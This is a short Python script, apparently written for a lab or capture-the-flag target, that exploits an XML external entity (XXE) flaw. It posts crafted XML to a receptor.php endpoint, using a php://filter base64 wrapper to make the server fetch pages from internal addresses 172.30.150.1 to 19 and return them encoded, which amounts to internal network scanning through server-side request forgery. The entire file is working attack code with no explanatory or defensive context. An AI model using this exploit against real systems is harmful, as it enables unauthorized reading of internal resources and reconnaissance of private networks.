import requests
import base64

def build_xml(string):
	xml = """<?xml version="1.0"?>"""
	xml = xml + "\r\n" + """<!DOCTYPE hola ["""
	xml = xml + "\r\n" + """<!ENTITY xxe SYSTEM """ + '"' + string + '"' + """>]>"""
	xml = xml + "\r\n" + """<xml><cosas>&xxe;</cosas></xml>"""
	send_xml(xml)

def send_xml(xml):
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	x = requests.post('http://172.30.150.6/receptor.php', data={'xml':xml}, headers=headers, timeout=5).text
	coded_string = x.split(' ')[-2]
#	print(coded_string)
	print(base64.b64decode(coded_string).decode('utf8'))
for i in range(1, 20):
	try:
		i = str(i)
		ip = '172.30.150.' + i
		string = 'php://filter/convert.base64-encode/resource=http://' + ip + '/'
		print(ip)
		build_xml(string)
	except:
		continue
